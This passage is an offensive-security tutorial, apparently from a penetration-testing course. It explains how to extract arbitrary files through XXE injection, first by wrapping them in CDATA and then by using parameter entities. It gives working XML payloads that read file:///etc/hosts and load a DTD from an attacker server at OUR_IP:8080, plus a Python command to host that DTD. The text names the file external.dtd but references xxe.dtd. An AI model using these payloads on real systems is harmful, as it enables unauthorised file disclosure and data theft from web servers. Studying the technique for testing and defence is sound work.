In the event that basic XXE won't work or when we are dealing with other web development frameworks, we can utilize the following method to extract any kind of data (including binary data) for any web application backend.

To output data that does not conform to the XML format, we can wrap the content of the external file reference with a `CDATA` tag (e.g. `<![CDATA[ FILE_CONTENT ]]>`). This way, the XML parser would consider this part raw data, which may contain any type of data, including any special characters.

To start, we must first define a `begin` internal entity with `<![CDATA[`, an `end` internal entity with `]]>`, and then place our external entity file in between, and it should be considered as a `CDATA` element, as follows:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///etc/hosts">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```
After that, if we reference the `&joined;` entity, it should contain our escaped data. However, there will be times that this will not work, since XML prevents joining internal and external entities, so we will have to find a better way to do so.

To bypass this, we can utilize `XML Parameter Entities`, a special type of entity that starts with a `%` character and can only be used within the DTD. What's unique about parameter entities is that if we reference them from an external source (e.g., our own server), then all of them would be considered as external and can be joined. First create a DTD file named `external.dtd` using the following value:
```dtd
<!ENTITY joined "%begin;%file;%end;">
```
Then start a local server to host the file using Python.
```bash
python3 -m http.server 8080
```

Now we can reference our external entity and print the `&joined` entity we defined above.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///etc/hosts">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8080/xxe.dtd">
  %xxe;
]>
...
<email>&joined;</email>
```